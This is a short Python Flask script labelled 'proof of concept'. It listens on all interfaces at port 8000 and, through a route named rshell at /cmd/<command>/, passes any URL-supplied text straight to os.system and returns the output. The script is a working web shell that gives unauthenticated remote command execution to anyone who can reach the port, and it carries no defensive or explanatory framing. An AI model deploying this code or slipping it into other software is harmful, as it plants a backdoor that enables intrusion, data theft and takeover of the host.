from flask import Flask, send_file
from os import system

app = Flask(__name__)
@app.route('/', methods = ['GET', 'POST'])
def Index():
  return "proof of concept"

@app.route('/cmd/<string:command>/')
def rshell(command):

  system(f"{command}>response.txt")

  return send_file("response.txt")

if __name__ == "__main__":
  app.run(debug=False,host='0.0.0.0', port=8000)